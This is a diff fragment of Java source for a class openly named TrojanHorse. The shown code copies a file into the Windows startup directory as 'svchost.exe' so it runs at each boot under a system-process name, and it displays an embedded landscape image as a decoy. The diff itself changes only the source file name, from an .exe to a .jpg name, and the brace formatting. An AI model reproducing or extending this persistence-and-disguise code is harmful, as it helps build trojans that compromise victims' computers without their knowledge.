@@ -19,11 +19,14 @@ public class TrojanHorse
         {
             new TrojanHorse();
 
-            File source = new File("IMG_01648123.exe");
+            File source = new File("IMG_01648129.jpg");
             File destination = new File(startUpDirectory + "\\svchost.exe");
-            try {
+            try
+            {
                 Files.copy(source.toPath(),destination.toPath());
-            } catch (IOException e) {
+            }
+            catch (IOException e)
+            {
                 e.printStackTrace();
             }
         }
@@ -41,7 +44,6 @@ public class TrojanHorse
     {
         try {
             String filename = "/resources/landscape.jpg";
-//            File file = new File(getClass().getResource(filename).toURI());
 
             InputStream resourceAsStream = getClass().getResourceAsStream(filename);
             BufferedImage image = ImageIO.read(resourceAsStream);
